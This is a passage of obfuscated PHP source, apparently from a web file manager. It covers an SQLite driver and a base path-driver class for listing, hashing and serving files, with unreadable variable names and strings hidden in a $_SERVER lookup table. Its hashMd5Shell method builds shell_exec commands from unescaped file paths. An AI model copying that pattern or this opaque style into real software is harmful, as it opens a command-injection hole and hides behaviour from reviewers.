query($è¡ÛˆÃÍ) { $¯¤ Ë«¡ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $è¡ÛˆÃÍ; if ($this->queryID) { $this->free(); } think_action_status($¯¤ Ë«¡[23], 1); think_status($¯¤ Ë«¡[24]); $this->queryID = $this->_linkID->query($è¡ÛˆÃÍ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ö áÓú« = $this->getAll(); $this->numRows = count($Ö áÓú«); return $Ö áÓú«; } } public function execute($ôè’¢Â) { $¡¬•ïàÙ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ôè’¢Â; if ($this->queryID) { $this->free(); } think_action_status($¡¬•ïàÙ[25], 1); think_status($¡¬•ïàÙ[24]); $êœæÙ¸ò = $this->_linkID->exec($ôè’¢Â); $this->debug(); if (!1 === $êœæÙ¸ò) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹òÍ›æş][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹öœØƒü = $this->_linkID->query($_SERVER[¹òÍ›æş][27]); if (!$¹öœØƒü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Á®ÄÔĞ» = $this->_linkID->query($_SERVER[¹òÍ›æş][28]); if (!$Á®ÄÔĞ») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $²î·î¦š = array(); while ($¿®îİòÆ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $²î·î¦š[] = $¿®îİòÆ; } $this->queryID->reset(); return $²î·î¦š; } public function getFields($ŞÕö¬Ô) { $ğÁ‘Ÿ£  =& $_SERVER[¹òÍ›æş]; $ĞùÇø¦  = $this->query($ğÁ‘Ÿ£ [29] . $ŞÕö¬Ô . $ğÁ‘Ÿ£ [30]); $‹Çºşè¨ = array(); if ($ĞùÇø¦ ) { foreach ($ĞùÇø¦  as $øÀË¦“ü => $Ë‘Ô„¾Á) { $‹Çºşè¨[$Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [32]]] = array($ğÁ‘Ÿ£ [32] => $Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [32]], $ğÁ‘Ÿ£ [33] => $Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [33]], $ğÁ‘Ÿ£ [35] => (bool) ($Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [35]] === $ğÁ‘Ÿ£ [12]), $ğÁ‘Ÿ£ [37] => $Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [66]], $ğÁ‘Ÿ£ [39] => (bool) $Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [67]], $ğÁ‘Ÿ£ [42] => (bool) $Ë‘Ô„¾Á[$ğÁ‘Ÿ£ [67]]); } } return $‹Çºşè¨; } public function getTables($ª÷Åûà = '') { $©ì££€Ë =& $_SERVER[¹òÍ›æş]; $ß ïñÀú = $this->query($©ì££€Ë[45] . $©ì££€Ë[46] . $©ì££€Ë[47]); $ø®€ âÂ = array(); foreach ($ß ïñÀú as $’öíØ‹… => $á¿ÖŒï») { $ø®€ âÂ[$’öíØ‹…] = current($á¿ÖŒï»); } return $ø®€ âÂ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¶·‚÷óÄ =& $_SERVER[¹òÍ›æş]; $this->error = $this->_linkID->lastErrorMsg(); if ($¶·‚÷óÄ[12] != $this->queryStr) { $this->error .= LNG($¶·‚÷óÄ[48]) . $this->queryStr; } think_trace($this->error, $¶·‚÷óÄ[12], $¶·‚÷óÄ[49]); return $this->error; } public function escapeString($ÑÈúÃ§Œ) { $Ü”Şîïƒ =& $_SERVER[¹òÍ›æş]; if ($this->_linkID) { return $this->_linkID->escapeString($ÑÈúÃ§Œ); } return str_ireplace($Ü”Şîïƒ[68], $Ü”Şîïƒ[69], $ÑÈúÃ§Œ); } public function parseLimit($áÊˆĞ°Í) { $ÈÎÃúïì =& $_SERVER[¹òÍ›æş]; $›€×°Ô¤ = $ÈÎÃúïì[12]; if (!empty($áÊˆĞ°Í)) { $áÊˆĞ°Í = explode($ÈÎÃúïì[50], $áÊˆĞ°Í); if (count($áÊˆĞ°Í) > 1) { $›€×°Ô¤ .= $ÈÎÃúïì[51] . $áÊˆĞ°Í[1] . $ÈÎÃúïì[52] . $áÊˆĞ°Í[0] . $ÈÎÃúïì[53]; } else { $›€×°Ô¤ .= $ÈÎÃúïì[51] . $áÊˆĞ°Í[0] . $ÈÎÃúïì[53]; } } return $›€×°Ô¤; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ù¿£³Ù =& $_SERVER[¹òÍ›æş]; $this->objectDriver = array($Ù¿£³Ù[70], $Ù¿£³Ù[71], $Ù¿£³Ù[72], $Ù¿£³Ù[73], $Ù¿£³Ù[74], $Ù¿£³Ù[75], $Ù¿£³Ù[76], $Ù¿£³Ù[77], $Ù¿£³Ù[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($­£ü¬ïÁ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($­£ü¬ïÁ, $_SERVER[¹òÍ›æş][8]); } return $­£ü¬ïÁ; } public function iconvApp($Ÿ¤ø­İ) { return $Ÿ¤ø­İ; } public function iconvSystem($×ìªõŠı) { return $×ìªõŠı; } public function iconvTo($äë÷áÆª, $çóÂ»£Ò, $âäå¦îè) { $¿Ù¼Ëâ¸ =& $_SERVER[¹òÍ›æş]; if (!$äë÷áÆª || !function_exists($¿Ù¼Ëâ¸[79])) { return $äë÷áÆª; } static $Üø¾Œèª = array(); $øİÔ•ê = $çóÂ»£Ò . $¿Ù¼Ëâ¸[80] . $âäå¦îè . $¿Ù¼Ëâ¸[81] . $äë÷áÆª; if (isset($Üø¾Œèª[$øİÔ•ê])) { return $Üø¾Œèª[$øİÔ•ê]; } if (function_exists($¿Ù¼Ëâ¸[82])) { $ğ×øœÏè = @mb_convert_encoding($äë÷áÆª, $âäå¦îè, $çóÂ»£Ò); } else { $ğ×øœÏè = @iconv($çóÂ»£Ò, $âäå¦îè, $äë÷áÆª); } $ğ×øœÏè = $ğ×øœÏè ? $ğ×øœÏè : $äë÷áÆª; if (strstr($ğ×øœÏè, $¿Ù¼Ëâ¸[83])) { $ğ×øœÏè = str_replace($¿Ù¼Ëâ¸[83], $¿Ù¼Ëâ¸[11], $ğ×øœÏè); } $Üø¾Œèª[$çóÂ»£Ò . $¿Ù¼Ëâ¸[80] . $âäå¦îè . $¿Ù¼Ëâ¸[81] . $äë÷áÆª] = $ğ×øœÏè; $Üø¾Œèª[$âäå¦îè . $¿Ù¼Ëâ¸[80] . $çóÂ»£Ò . $¿Ù¼Ëâ¸[81] . $äë÷áÆª] = $äë÷áÆª; $Üø¾Œèª[$âäå¦îè . $¿Ù¼Ëâ¸[80] . $çóÂ»£Ò . $¿Ù¼Ëâ¸[81] . $ğ×øœÏè] = $äë÷áÆª; $Üø¾Œèª[$çóÂ»£Ò . $¿Ù¼Ëâ¸[80] . $âäå¦îè . $¿Ù¼Ëâ¸[81] . $ğ×øœÏè] = $ğ×øœÏè; return $ğ×øœÏè; } public function getPathInner($îæÛëØ¿) { $ßöÀ¾¹œ = IO::init($îæÛëØ¿); return $ßöÀ¾¹œ->path; } public function getPathOuter($ÁßÁ š­) { $‡±Óú¼Ò =& $_SERVER[¹òÍ›æş]; $‰æ¿³úÒ = strlen(trim($this->pathBase, $‡±Óú¼Ò[8])); $ÁßÁ š­ = substr(trim($ÁßÁ š­, $‡±Óú¼Ò[8]), $‰æ¿³úÒ); return $this->pathDriver . $‡±Óú¼Ò[8] . ltrim($ÁßÁ š­, $‡±Óú¼Ò[8]); } public function isParentOf($Ë‘ŠøÇ, $•çÜ“ûû) { $ûÌüŞ³ş =& $_SERVER[¹òÍ›æş]; $Ë‘ŠøÇ = rtrim(strtolower($Ë‘ŠøÇ), $ûÌüŞ³ş[8]) . $ûÌüŞ³ş[8]; $•çÜ“ûû = rtrim(strtolower($•çÜ“ûû), $ûÌüŞ³ş[8]) . $ûÌüŞ³ş[8]; $Ë­ïÆÅñ = strpos($•çÜ“ûû, $Ë‘ŠøÇ) === 0; return $Ë­ïÆÅñ; } public function getType() { $Ìî—Ûš  =& $_SERVER[¹òÍ›æş]; $¼¿Œ´Ì = str_replace($Ìî—Ûš [84], $Ìî—Ûš [12], get_class($this)); return strtolower($¼¿Œ´Ì); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($£¾ÉÃ¼Í, $ıİÉòÛ) { $Æ·ş¢“ú =& $_SERVER[¹òÍ›æş]; $÷äÀÈ­» = rtrim($£¾ÉÃ¼Í, $Æ·ş¢“ú[8]) . $Æ·ş¢“ú[8] . $ıİÉòÛ; $»‰Ÿˆ¹ = $this->exist($÷äÀÈ­»); return $»‰Ÿˆ¹ ? $÷äÀÈ­» : !1; } public function setModifyTime($©¿ŒñÒğ, $äãŒäœ = '') { } public function renameObject($ù¯Ò§¸, $Äôğ€—¬) { $áÔ«Æã¹ = $Äôğ€—¬; $ù¯Ò§¸ = $this->getPathOuter($ù¯Ò§¸); $Äôğ€—¬ = $this->pathFather($ù¯Ò§¸) . $Äôğ€—¬; $ª÷ô½ˆ´ = IO::copy($ù¯Ò§¸, $this->pathFather($ù¯Ò§¸), REPEAT_RENAME_FOLDER, $áÔ«Æã¹); if ($ª÷ô½ˆ´) { IO::remove($ù¯Ò§¸); } return $ª÷ô½ˆ´ ? $Äôğ€—¬ : !1; } public function tempFile($ÅÄ…†‚ = '', $³§»—Ìø = '') { if (!$ÅÄ…†‚) { $ÅÄ…†‚ = rand_string(15); } $‰€ÕŒÌı = TEMP_FILES . rand_string(15) . $_SERVER[¹òÍ›æş][8]; @mkdir($‰€ÕŒÌı, DEFAULT_PERRMISSIONS, !0); $òÆú¾©› = $‰€ÕŒÌı . $ÅÄ…†‚; @touch($òÆú¾©›); if ($³§»—Ìø) { file_put_contents($òÆú¾©›, $³§»—Ìø); } return $òÆú¾©›; } public function tempFileRemve($Ë‡¼‰¹í) { @unlink($Ë‡¼‰¹í); @rmdir($this->pathFather($Ë‡¼‰¹í)); } public function mkfile($û¤ÈüÑş, $¾§Øòç = '', $ì†˜¢¿ = REPEAT_RENAME) { } public function mkdir($†’±Ø§ˆ, $¬šé¸ÈÛ = REPEAT_SKIP) { } public function delFile($†åİÃ©) { } public function delFolder($çÛ­¶àĞ) { } public function copyFile($÷‹ô°á, $µâßÁšó) { } public function moveFile($Û½¯ş°£, $±ş°Ê†) { } public function remove($»ıÃ³İì) { if ($this->isFile($»ıÃ³İì)) { return $this->delFile($»ıÃ³İì); } return $this->delFolder($»ıÃ³İì); } public function rename($ÔÅ˜¨Öì, $–ÒÙ†æ) { } public function exist($‘ëÂƒğ¬) { } public function findByHash($¿…Àö”ü = '', $Å’˜€‡ = '') { return !1; } public function isFile($¢õŠ©‚©) { } public function isFolder($’¿—ú¶¨) { } public function size($²”ù˜°Ÿ) { } public function info($ÛôşÔóŞ) { } public function infoSimple($’ö€¿Ïç) { return $this->info($’ö€¿Ïç); } public function infoAuth($ŞÒàäÑâ) { return $this->info($ŞÒàäÑâ); } public function infoFull($×†Í³Ø™) { return $this->info($×†Í³Ø™); } public function infoWithChildren($¶èæÃÌ¹) { $àİÏÌîÃ =& $_SERVER[¹òÍ›æş]; static $Öí£Ö¤í = array(); if (isset($Öí£Ö¤í[$¶èæÃÌ¹])) { return $Öí£Ö¤í[$¶èæÃÌ¹]; } $ÀßÁ¤ø¾ = $this->info($¶èæÃÌ¹); if ($ÀßÁ¤ø¾ && $ÀßÁ¤ø¾[$àİÏÌîÃ[33]] == $àİÏÌîÃ[85]) { $¯Ô›îÍé = array($àİÏÌîÃ[86] => 0, $àİÏÌîÃ[87] => 0, $àİÏÌîÃ[88] => 0); $this->infoChildren($¶èæÃÌ¹, $¯Ô›îÍé); $ÀßÁ¤ø¾[$àİÏÌîÃ[86]] = $¯Ô›îÍé[$àİÏÌîÃ[86]]; $ÀßÁ¤ø¾[$àİÏÌîÃ[89]] = array($àİÏÌîÃ[90] => $¯Ô›îÍé[$àİÏÌîÃ[87]], $àİÏÌîÃ[91] => $¯Ô›îÍé[$àİÏÌîÃ[88]]); $Öí£Ö¤í[$¶èæÃÌ¹] = $ÀßÁ¤ø¾; } return $ÀßÁ¤ø¾; } public function listPath($²…İù•£, $Å¤¨…¡ = false) { } public function has($¸çÊ¿©›, $ÇÃÉ›ÆĞ = false, $íÑï••® = false) { } public function canRead($–…œæ‹ø) { } public function canWrite($ùøŸöšª) { } public function getContent($ßÎç³Ö) { } public function setContent($ˆÌ¹ÖÊá, $ˆÓÊ˜ = '') { } protected function infoChildren($ŠíÊ‰ş, &$ŸçüñÑ†) { $õ‡ØÚüÚ =& $_SERVER[¹òÍ›æş]; check_abort_echo(); $ÂêĞğö² = $this->listPath($ŠíÊ‰ş, !0); $ÂêĞğö² = array_merge($ÂêĞğö²[$õ‡ØÚüÚ[92]], $ÂêĞğö²[$õ‡ØÚüÚ[93]]); foreach ($ÂêĞğö² as $–•şÆÚ) { if ($–•şÆÚ[$õ‡ØÚüÚ[33]] == $õ‡ØÚüÚ[85]) { $ŸçüñÑ†[$õ‡ØÚüÚ[88]]++; $×±Ä¿ô© = $this->getPathInner($–•şÆÚ[$õ‡ØÚüÚ[94]]); $this->infoChildren($×±Ä¿ô©, $ŸçüñÑ†); } else { $ŸçüñÑ†[$õ‡ØÚüÚ[87]]++; $ŸçüñÑ†[$õ‡ØÚüÚ[86]] += $–•şÆÚ[$õ‡ØÚüÚ[86]]; } } } public function fileSubstr($×¼ŒÕŸ¡, $º§À–ÍÕ, $½©Ñ„—½) { } public function listAll($Şš¹Œ„„) { } public function listAllMake($£Øåíà, &$Ÿœ¥•®) { $™¼çóƒ… =& $_SERVER[¹òÍ›æş]; check_abort_echo(); $ì±î“˜… = $this->listPath($£Øåíà, !0); if (!$ì±î“˜…) { return; } $ß™Ù´ûØ = array_merge($ì±î“˜…[$™¼çóƒ…[92]], $ì±î“˜…[$™¼çóƒ…[93]]); foreach ($ß™Ù´ûØ as $§şŒµ­‚) { $¢ì¦™¬ = $§şŒµ­‚[$™¼çóƒ…[33]] == $™¼çóƒ…[85]; $¾§çäæ’ = array($™¼çóƒ…[94] => $§şŒµ­‚[$™¼çóƒ…[94]], $™¼çóƒ…[85] => $¢ì¦™¬); if (isset($§şŒµ­‚[$™¼çóƒ…[86]])) { $¾§çäæ’[$™¼çóƒ…[86]] = $§şŒµ­‚[$™¼çóƒ…[86]]; } if (isset($§şŒµ­‚[$™¼çóƒ…[95]])) { $¾§çäæ’[$™¼çóƒ…[95]] = $§şŒµ­‚[$™¼çóƒ…[95]]; } if (!$¢ì¦™¬) { $Ÿœ¥•®[] = $¾§çäæ’; continue; } $Ÿœ¥•®[] = $¾§çäæ’; $¬‘Êıüµ = $§şŒµ­‚[$™¼çóƒ…[94]]; $È»Çû˜à = $this->pathDriver; if (substr($§şŒµ­‚[$™¼çóƒ…[94]], 0, strlen($È»Çû˜à)) == $È»Çû˜à) { $¬‘Êıüµ = substr($¬‘Êıüµ, strlen($È»Çû˜à)); } $this->listAllMake($¬‘Êıüµ, $Ÿœ¥•®); } } public function listAllSimple($œáÕüñÊ, $š¢¿áóÂ = false) { $ğ”ŸÆ¯ = $this->listAll($œáÕüñÊ); return $this->listAllSimpleMake($ğ”ŸÆ¯, $this->getPathOuter($œáÕüñÊ), $š¢¿áóÂ); } public function listAllSimpleMake($û€Ë¸¯–, $¤ú§ÇÎ, $›¸ÉÓ•Ê) { $ê¦±ñæ” =& $_SERVER[¹òÍ›æş]; $´Ğ†á­Ê = array(); $¤ú§ÇÎ = rtrim(get_path_father($¤ú§ÇÎ), $ê¦±ñæ”[8]) . $ê¦±ñæ”[8]; foreach ($û€Ë¸¯– as $Ğî¥ú‹¯) { $¾áì©Ê† = array($ê¦±ñæ”[94] => $Ğî¥ú‹¯[$ê¦±ñæ”[94]], $ê¦±ñæ”[96] => $Ğî¥ú‹¯[$ê¦±ñæ”[94]], $ê¦±ñæ”[85] => $Ğî¥ú‹¯[$ê¦±ñæ”[85]]); if (isset($Ğî¥ú‹¯[$ê¦±ñæ”[86]]) && !$Ğî¥ú‹¯[$ê¦±ñæ”[85]]) { $¾áì©Ê†[$ê¦±ñæ”[86]] = $Ğî¥ú‹¯[$ê¦±ñæ”[86]]; } if (isset($Ğî¥ú‹¯[$ê¦±ñæ”[95]])) { $¾áì©Ê†[$ê¦±ñæ”[95]] = $Ğî¥ú‹¯[$ê¦±ñæ”[95]]; } if (is_array($Ğî¥ú‹¯[$ê¦±ñæ”[97]])) { $¾áì©Ê†[$ê¦±ñæ”[96]] = $Ğî¥ú‹¯[$ê¦±ñæ”[97]][$ê¦±ñæ”[94]]; $¾áì©Ê†[$ê¦±ñæ”[86]] = $Ğî¥ú‹¯[$ê¦±ñæ”[97]][$ê¦±ñæ”[86]]; $¾áì©Ê†[$ê¦±ñæ”[95]] = $Ğî¥ú‹¯[$ê¦±ñæ”[97]][$ê¦±ñæ”[95]]; } else { if (substr($Ğî¥ú‹¯[$ê¦±ñæ”[94]], 0, strlen($¤ú§ÇÎ)) == $¤ú§ÇÎ) { $¾áì©Ê†[$ê¦±ñæ”[94]] = substr($Ğî¥ú‹¯[$ê¦±ñæ”[94]], strlen($¤ú§ÇÎ)); } } $®î°Òô = $Ğî¥ú‹¯[$ê¦±ñæ”[85]] ? $ê¦±ñæ”[8] : $ê¦±ñæ”[12]; $¾áì©Ê†[$ê¦±ñæ”[96]] = rtrim($¾áì©Ê†[$ê¦±ñæ”[96]], $ê¦±ñæ”[8]) . $®î°Òô; $¾áì©Ê†[$ê¦±ñæ”[94]] = $ê¦±ñæ”[8] . trim($¾áì©Ê†[$ê¦±ñæ”[94]], $ê¦±ñæ”[8]) . $®î°Òô; if (!$›¸ÉÓ•Ê) { $¶«üÄ´ = explode($ê¦±ñæ”[8], trim($¾áì©Ê†[$ê¦±ñæ”[94]], $ê¦±ñæ”[8])); $¾áì©Ê†[$ê¦±ñæ”[94]] = $ê¦±ñæ”[8] . implode($ê¦±ñæ”[8], array_slice($¶«üÄ´, 1)) . $®î°Òô; } $´Ğ†á­Ê[] = $¾áì©Ê†; } return array_sort_by($´Ğ†á­Ê, $ê¦±ñæ”[94]); } public function upload($ÙÀ›öŞ, $ãÂ¸Áºñ, $Ö³®šœœ = false, $Ï¯Ã–Öã = REPEAT_REPLACE) { } public function uploadFileByID($ºöÅõŸ, $÷é¬êÌ, $âÀÆÎÊü) { } public function uploadFileByPath($ ’èæøü, $ˆ¼ñ¿“‹, $ıà„¼„­ = array()) { } public function isUploadServer() { $­³äô‚± =& $_SERVER[¹òÍ›æş]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $­³äô‚±[98]) { return !0; } return $GLOBALS[$­³äô‚±[6]][$­³äô‚±[99]][$­³äô‚±[100]]; } public function isFileOutServer() { $ß˜šºãé =& $_SERVER[¹òÍ›æş]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ß˜šºãé[98]) { return !0; } return $GLOBALS[$ß˜šºãé[6]][$ß˜šºãé[99]][$ß˜šºãé[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($±‡Ş—§é) { $¨ÊïÚú =& $_SERVER[¹òÍ›æş]; if (!$this->isCdnHost()) { return $±‡Ş—§é; } return str_replace(trim(get_url_root($±‡Ş—§é), $¨ÊïÚú[8]), trim($this->cdnHost, $¨ÊïÚú[8]), $±‡Ş—§é); } public function uploadLink($Õ—üªß, $¯ôø¢°ü = 0) { $ÉÑÆ³İ¾ =& $_SERVER[¹òÍ›æş]; if ($this->isUploadServer()) { return; } $‰¤ĞÆ¡å = $this->getType(); if (!in_array($‰¤ĞÆ¡å, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Çè»øèÌ = 1024 * 1024 * 10; $›¿ÌµçÌ = $¯ôø¢°ü <= $Çè»øèÌ ? $ÉÑÆ³İ¾[102] : $ÉÑÆ³İ¾[103]; $Ñ»å¬³» = (!$¯ôø¢°ü ? 1 : ceil($¯ôø¢°ü / pow(1024, 3))) * 3600 * 4; $½Ë¥” Û = $this->{$›¿ÌµçÌ}($Õ—üªß, $Ñ»å¬³»); if ($½Ë¥” Û) { $½Ë¥” Û[$ÉÑÆ³İ¾[104]] = $Õ—üªß; $½Ë¥” Û[$ÉÑÆ³İ¾[105]] = $‰¤ĞÆ¡å; } return $½Ë¥” Û; } public function uploadFormData($¯„âüşÃ, $˜’íìé = 3600) { } public function multiUploadFormData($İ™†äİ´, $·ÀÚ·•Ó = 3600) { } public function download($ÁÀ¬¸„›, $Ï»Ôƒà«) { } public function ext($âªù•Ğ) { $¶é¥šØª =& $_SERVER[¹òÍ›æş]; if (strpos($âªù•Ğ, $¶é¥šØª[8]) === -1) { $èîğ½šŒ = $âªù•Ğ; } else { $èîğ½šŒ = $this->pathThis($âªù•Ğ); } $§ŠÚ¦Ğ‹ = $¶é¥šØª[12]; if (strstr($èîğ½šŒ, $¶é¥šØª[10])) { $§ŠÚ¦Ğ‹ = substr($èîğ½šŒ, strrpos($èîğ½šŒ, $¶é¥šØª[10]) + 1); $§ŠÚ¦Ğ‹ = strtolower($§ŠÚ¦Ğ‹); } if (strlen($§ŠÚ¦Ğ‹) > 3 && preg_match($¶é¥šØª[106], $§ŠÚ¦Ğ‹, $ğ µ×í›)) { $§ŠÚ¦Ğ‹ = $¶é¥šØª[12]; } return $§ŠÚ¦Ğ‹; } public function pathThis($‰¯Ç•”ë) { $ŠÖüØè =& $_SERVER[¹òÍ›æş]; $‰¯Ç•”ë = str_replace($ŠÖüØè[107], $ŠÖüØè[8], rtrim($‰¯Ç•”ë, $ŠÖüØè[8])); $Ùšá›•£ = strrpos($‰¯Ç•”ë, $ŠÖüØè[8]); if ($Ùšá›•£ === !1) { return $‰¯Ç•”ë; } return substr($‰¯Ç•”ë, $Ùšá›•£ + 1); } public function pathFather($àş½°ù‹) { $¬Ÿ¦á Ğ =& $_SERVER[¹òÍ›æş]; $àş½°ù‹ = str_replace($¬Ÿ¦á Ğ[107], $¬Ÿ¦á Ğ[8], rtrim($àş½°ù‹, $¬Ÿ¦á Ğ[8])); $¾Æ¢Æ = strrpos($àş½°ù‹, $¬Ÿ¦á Ğ[8]); if ($¾Æ¢Æ === !1) { return $¬Ÿ¦á Ğ[12]; } return substr($àş½°ù‹, 0, $¾Æ¢Æ + 1); } public function hashSimple($üÔ¦ÍÚ÷) { $‚•œ”Æí =& $_SERVER[¹òÍ›æş]; if (!$üÔ¦ÍÚ÷) { return md5($‚•œ”Æí[12]); } $õéÅƒŞ = $this->size($üÔ¦ÍÚ÷); $Ó‘ÒÜƒ = 200; $ÓØûªå¹ = 50; if ($õéÅƒŞ <= $Ó‘ÒÜƒ * $ÓØûªå¹) { return $this->hashMd5($üÔ¦ÍÚ÷) . $õéÅƒŞ; } $£æ£œ¤ = intval($õéÅƒŞ / $ÓØûªå¹); $’½‹¦²÷ = $‚•œ”Æí[12]; for ($ğğã‚åÜ = 0; $ğğã‚åÜ < $ÓØûªå¹; $ğğã‚åÜ++) { $’½‹¦²÷ .= $this->fileSubstr($üÔ¦ÍÚ÷, $£æ£œ¤ * $ğğã‚åÜ, $Ó‘ÒÜƒ); } $’½‹¦²÷ .= $this->fileSubstr($üÔ¦ÍÚ÷, $õéÅƒŞ - $Ó‘ÒÜƒ, $Ó‘ÒÜƒ); return md5($’½‹¦²÷) . $õéÅƒŞ; } public static $md5Cache = array(); public function hashMd5($çË–‰Í™) { if (!$çË–‰Í™) { return md5($_SERVER[¹òÍ›æş][12]); } $çË–‰Í™ = $this->iconvSystem($çË–‰Í™); if (isset(self::$md5Cache[$çË–‰Í™])) { return self::$md5Cache[$çË–‰Í™]; } self::$md5Cache[$çË–‰Í™] = $this->hashMd5Shell($çË–‰Í™); if (!self::$md5Cache[$çË–‰Í™]) { self::$md5Cache[$çË–‰Í™] = @md5_file($çË–‰Í™); } return self::$md5Cache[$çË–‰Í™]; } private function hashMd5Shell($ëùê£‘×) { $êµşÚ“ö =& $_SERVER[¹òÍ›æş]; if (!$ëùê£‘×) { return md5($êµşÚ“ö[12]); } if (!function_exists($êµşÚ“ö[108])) { return !1; } $¤­¶ĞÑ = array($êµşÚ“ö[109], $êµşÚ“ö[110]); $øóèáÍ = Cache::get($êµşÚ“ö[111]); if (!$øóèáÍ) { $ÄîË¾±Ê = BASIC_PATH . $êµşÚ“ö[112]; $Öïéù½ó = md5_file($ÄîË¾±Ê); $øóèáÍ = $êµşÚ“ö[113]; foreach ($¤­¶ĞÑ as $’‰—¦š) { $ÂÀÒ÷‡· = shell_exec($’‰—¦š . "\x20\x22{$ÄîË¾±Ê}\42"); if ($ÂÀÒ÷‡· && substr(trim($ÂÀÒ÷‡·), 0, 32) == $Öïéù½ó) { $øóèáÍ = $’‰—¦š; break; } } Cache::set($êµşÚ“ö[111], $øóèáÍ, 3600); } if ($øóèáÍ == $êµşÚ“ö[113]) { return !1; } $ÂÀÒ÷‡· = shell_exec($øóèáÍ . "\40\42{$ëùê£‘×}\x22"); $ÂÀÒ÷‡· = str_replace($êµşÚ“ö[114], $êµşÚ“ö[12], $ÂÀÒ÷‡·); return substr($ÂÀÒ÷‡·, 0, 32); } public function link($‘„™–€Ë) { return $‘„™–€Ë; } public function fileOut($­İèåÃ´, $ÔÔ©†ë = false, $Ê¦€ŒÄ = false, $ÔôŸ†” = '') { $Ş€áÀŠ =& $_SERVER[¹òÍ›æş]; $this->cacheMethod(null, null); if (!$­İèåÃ´ || !$this->exist($­İèåÃ´)) { show_json(LNG($Ş€áÀŠ[115]), !1, $Ê¦€ŒÄ); } $¿Ë×™¦¥ = $this->getType() == $Ş€áÀŠ[116]; $Ôä±‘öÉ = $GLOBALS[$Ş€áÀŠ[6]][$Ş€áÀŠ[99]][$Ş€áÀŠ[117]][$Ş€áÀŠ[118]]; $¬‹æÙÄ¸ = (double) $GLOBALS[$Ş€áÀŠ[6]][$Ş€áÀŠ[99]][$Ş€áÀŠ[117]][$Ş€áÀŠ[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $­¯–Ãø… = $this->infoFull($­İèåÃ´); $¬¿®Ã‚Ï = $­¯–Ãø…[$Ş€áÀŠ[86]]; $‹åÇÈº£ = gmdate($Ş€áÀŠ[120], $­¯–Ãø…[$Ş€áÀŠ[95]]); $²ö»£‹ = $Ê¦€ŒÄ ? $Ê¦€ŒÄ : $this->iconvApp($­¯–Ãø…[$Ş€áÀŠ[32]]); $¯¦‡¢Áâ = 0; $áÒİ”ïî = $¬¿®Ã‚Ï - 1; $æÅùª©¼ = $this->ext($²ö»£‹); if (in_array($æÅùª©¼, array($Ş€áÀŠ[121], $Ş€áÀŠ[122], $Ş€áÀŠ[123], $Ş€áÀŠ[124]))) { $æÅùª©¼ = $Ş€áÀŠ[125]; } if (in_array($æÅùª©¼, array($Ş€áÀŠ[126]))) { $æÅùª©¼ = $Ş€áÀŠ[127]; } if (!$ÔôŸ†”) { $ÔôŸ†” = md5($‹åÇÈº£ . $this->hashSimple($­İèåÃ´)); } $ÔôŸ†” = $Ş€áÀŠ[128] . $ÔôŸ†” . $Ş€áÀŠ[128]; $Ú”¢”Ñ§ = get_file_mime($æÅùª©¼); $¸ÕĞéñÉ = !0; $¸ÕĞéñÉ = isset($_GET[$Ş€áÀŠ[129]]) ? !1 : !0; if ($ÔÔ©†ë === !1 && !mime_support($Ú”¢”Ñ§)) { $Ú”¢”Ñ§ = $Ş€áÀŠ[130]; } header($Ş€áÀŠ[131]); header($Ş€áÀŠ[132] . $Ú”¢”Ñ§); $ÀÏÔ·ƒÕ = rawurlencode($²ö»£‹); $ÀÏÔ·ƒÕ = $Ş€áÀŠ[128] . $ÀÏÔ·ƒÕ . $Ş€áÀŠ[133] . $ÀÏÔ·ƒÕ; if ($ÔÔ©†ë) { header($Ş€áÀŠ[134]); header($Ş€áÀŠ[135] . $ÀÏÔ·ƒÕ); } else { if ($¸ÕĞéñÉ) { header($Ş€áÀŠ[136] . $ÀÏÔ·ƒÕ); } } header($Ş€áÀŠ[137] . gmdate($Ş€áÀŠ[120], time() + 3600 * 24 * 30) . $Ş€áÀŠ[138]); header($Ş€áÀŠ[139]); header($Ş€áÀŠ[140]); header($Ş€áÀŠ[141]); if (isset($_SERVER[$Ş€áÀŠ[142]]) && strtotime($_SERVER[$Ş€áÀŠ[142]]) == $­¯–Ãø…[$Ş€áÀŠ[95]]) { header($Ş€áÀŠ[143], !0, 304); die; } if (isset($_SERVER[$Ş€áÀŠ[144]]) && $_SERVER[$Ş€áÀŠ[144]] == $ÔôŸ†”) { header($Ş€áÀŠ[145] . $ÔôŸ†”, !0, 304); die; } header($Ş€áÀŠ[145] . $ÔôŸ†”); header($Ş€áÀŠ[146] . $‹åÇÈº£ . $Ş€áÀŠ[138]); header($Ş€áÀŠ[147] . $²ö»£‹); header($Ş€áÀŠ[148]); header($Ş€áÀŠ[149] . $¬¿®Ã‚Ï); header($Ş€áÀŠ[150]); if (!$ÔÔ©†ë && $æÅùª©¼ == $Ş€áÀŠ[151]) { if ($¬¿®Ã‚Ï > 1024 * 1024 * 5) { die; 